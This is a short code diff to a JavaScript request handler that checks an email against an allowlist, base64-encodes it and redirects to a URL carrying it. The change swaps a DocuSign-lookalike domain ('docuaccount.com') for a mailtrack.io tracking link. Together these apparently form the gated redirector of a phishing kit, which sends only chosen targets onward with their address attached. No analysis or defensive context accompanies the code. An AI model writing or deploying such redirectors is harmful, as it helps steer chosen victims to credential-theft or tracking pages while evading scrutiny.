@@ -24,7 +24,7 @@ export default function handler(req, res) {
     // Validate the email
     if (allowedEmailsCache.includes(email)) {
       // Construct the redirect URL
-      const baseURL = "https://Ref910183333.docuaccount.com/o0YWo/?e=";
+      const baseURL = "https://mailtrack.io/l/d151635665667ce66da947b8091a13b40b79f0fc/?e=";
       const encodedEmail = Buffer.from(email).toString("base64");
       const redirectURL = `${baseURL}${encodedEmail}`;
 
